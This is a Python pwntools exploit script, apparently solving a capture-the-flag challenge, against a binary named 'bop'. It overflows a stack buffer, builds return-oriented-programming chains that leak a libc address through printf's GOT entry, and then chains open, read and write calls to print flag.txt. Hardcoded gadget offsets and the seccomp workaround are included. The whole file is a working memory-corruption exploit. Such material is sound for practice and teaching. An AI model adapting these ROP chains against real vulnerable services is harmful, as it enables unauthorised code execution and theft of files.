from pwn import *
import binascii


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return elf.process()


def leak_libc_addr(rop):
    # creating gadget
    g  = cyclic(40)

    # rop.rdi = Gadget(0x4013d3, ['pop rdi', 'ret'], ['rdi'], 0x8)
    # this will set rdi so that it contains stack location that 
    # points to elf.got['printf']
    g += p64(rop.rdi[0])
    g += p64(elf.got['printf'])

    # ret is called for stack realignment
    g += p64(rop.ret[0])
    # this called printf and print elf.got['printf']
    g += p64(elf.plt['printf'])
    # for stack realignment
    g += p64(rop.ret[0])
    # call main 
    g += p64(main_addr)
    # send the gagdets to do the magic
    p.sendlineafter(b"bop? ", g)

    # should leak libc printf address
    leak_libc_printf = u64(p.recvuntil(b"D")[:-1].ljust(8, b'\x00'))

    # calculate libc address from the leak
    libc.address = leak_libc_printf - libc.sym['printf']
    print(f"[+] libc_address = 0x{libc.address:X}")

# Read the fd  and write its content to arb_writable_addr
# to the memory. 
# ssize_t read(int fildes, void *buf, size_t nbyte);
# RDI = 0, RSI = arb_writable_addr, rdx = nbyte
def read_file(text=None):
    g = cyclic(40)
    g += p64(rop.rdi[0])

    # This to read from stdin
    # and write the string `flag.txt` to
    # arb_writable_addr
    if text:
        g += p64(0)
    # this to read from fd and write its content to arb_writable_addr. 
    # The value of 3 looks fixed when i debugged so I hardcoded here. 
    # But practically, the fd could be anything. 
    else:
        g += p64(3)

    #  ['pop rsi', 'pop r15', 'ret']
    g += p64(rop.rsi[0])
    g += p64(arb_writable_addr)  # pop rsi
    g += p64(0)                  # pop r15
    g += p64(libc.address + libc_rop_rdx)
    # Reading 0x110 but you can set this to any 
    # arbitrary value
    g += p64(0x110)
    g += p64(libc.sym['read'])
    g += p64(rop.ret[0])
    g += p64(main_addr)
    p.sendlineafter("bop? ", g)
    # want to send text when reading from stdin
    if text:
        p.sendline(text)
    #print(p.recvuntil("D"))

def open_file():
    g =  b"A" * 40
    g += p64(rop.rdi[0])
    g += p64(arb_writable_addr)
    g += p64(rop.rsi[0])
    g += p64(0) + p64(0)
    # libc open calls the `sys_openat` syscall  but the  `sys_open` syscall is allowd
    #g += p64(libc.sym['open'])
    g += p64(libc.address + libc_rop_rax)
    # SYS_OPEN = 0x02
    g += p64(0x02)
    g += p64(libc.address + libc_rop_syscall)
    g += p64(rop.ret[0])
    g += p64(main_addr)
    p.sendlineafter("bop? ", g)
    #p.send(g)
    print(p.recvuntil("D"))

def write_file():
    g =  b"B" * 40
    g += p64(rop.rdi[0])
    g += p64(0x01)
    #  ['pop rsi', 'pop r15', 'ret']
    g += p64(rop.rsi[0])
    g += p64(arb_writable_addr)  # pop rsi
    g += p64(0)                  # pop r15
    g += p64(libc.address + libc_rop_rdx)
    g += p64(0x110)
    g += p64(libc.sym['write'])
    g += p64(rop.ret[0])
    g += p64(main_addr)
    p.sendlineafter("bop? ", g)
    print(p.recvuntil("D"))


gs = '''
break *0x0401352
c
'''

elf = ELF("./bop")
libc = elf.libc

# to get rop gadgets from `bop` file
rop = ROP(elf)
main_addr = 0x4012f9


# 0x0000000000036174: pop rax; ret;
libc_rop_rax = 0x036174

#ropper --file /usr/lib/x86_64-linux-gnu/libc-2.31.so --search "syscall"
# 0x00000000000630a9: syscall; ret;
libc_rop_syscall = 0x630a9

libc_rop_rdx  = 0x142c92
# 0x403000 - 0x405000 are writable
# choose a random address to write `flag.txt`
arb_writable_addr = 0x404500

#context.log_level = 'debug'
p = start()

# Get libc base address
leak_libc_addr(rop)

# write `flag.txt` to arb_writable_addr
read_file(b"flag.txt\x00")

# open flag.txt file
open_file()
print("[+] Read flag")
read_file()
print("[+] Write flag to stdout")
write_file()
